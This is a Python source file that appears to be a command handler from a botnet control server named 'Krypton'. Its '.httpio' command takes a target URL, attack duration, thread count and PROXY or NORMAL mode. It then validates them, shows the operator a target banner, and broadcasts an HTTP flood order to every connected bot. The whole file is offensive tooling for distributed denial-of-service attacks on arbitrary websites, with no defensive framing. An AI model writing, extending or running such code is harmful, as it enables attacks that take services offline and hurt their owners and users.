import time
from colorama import Fore

def httpio(args, validate_time, send, client, ansi_clear, broadcast, data):
    
    maxThreads = 100 # Threads Limit (recommended 100 or 130)

    if len(args) == 5:
        url = args[1]
        secs = args[2]
        threadx = int(args[3])
        attackType = args[4]

        xxxx = '''%s============= (%sTARGET%s) ==============
            %s URL:%s %s
            %sTIME:%s %s
            %sTYPE:%s %s
         %sTHREADS:%s %s
          %sMETHOD:%s %s'''%(Fore.LIGHTBLACK_EX, Fore.GREEN, Fore.LIGHTBLACK_EX, Fore.CYAN, Fore.LIGHTWHITE_EX, url, Fore.CYAN, Fore.LIGHTWHITE_EX, secs, Fore.CYAN, Fore.LIGHTWHITE_EX, attackType, Fore.CYAN, Fore.LIGHTWHITE_EX, threadx, Fore.CYAN, Fore.LIGHTWHITE_EX, 'HTTP IO')

        if validate_time(secs):
            if threadx <= maxThreads and threadx > 0:
                if attackType == 'PROXY' or attackType == 'NORMAL' or attackType == 'proxy' or attackType == 'normal':
                    for x in xxxx.split('\n'):
                        send(client, '\x1b[3;31;40m'+ x)
                    send(client, f" {Fore.LIGHTBLACK_EX}\nAttack {Fore.LIGHTGREEN_EX}successfully{Fore.LIGHTBLACK_EX} sent to all Krypton Bots!\n")
                    broadcast(data)
                else:
                    send(client, Fore.RED + '\nInvalid attack type (PROXY, NORMAL)\n')
            else:
              send(client, Fore.RED + '\nInvalid threads (1-100 threads)\n')  
        else:
            send(client, Fore.RED + '\nInvalid attack duration (1-1200 seconds)\n')
    else:
        send(client, f'\nUsage: {Fore.LIGHTBLACK_EX}.httpio [URL] [TIME] [THREADS] [PROXY, NORMAL]\n')
